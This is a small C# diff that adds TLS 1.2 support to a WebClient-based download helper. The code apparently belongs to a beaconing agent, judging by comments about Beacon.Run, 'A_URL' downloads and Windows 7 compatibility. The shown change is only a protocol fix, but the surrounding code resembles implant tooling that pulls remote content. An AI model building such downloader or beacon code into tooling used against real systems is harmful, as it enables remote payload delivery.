@@ -31,7 +31,15 @@ namespace CSharpAgent
         // and follows redirects.
         static byte[] Download(string url)
         {
-
+            // ServicePointManager is process-global: Beacon.Run has normally already |=-ed
+            // Tls12 onto the OS defaults before any A_URL download can run, but this path is
+            // reachable without a prior beacon (one-shot flows) — never rely on it. A
+            // Tls12-ONLY mask would brick stock Win7 here the same way it bricked the beacon.
+            try
+            {
+                ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
+            }
+            catch { }
 
             WebClient client = new WebClient();
             return client.DownloadData(url);
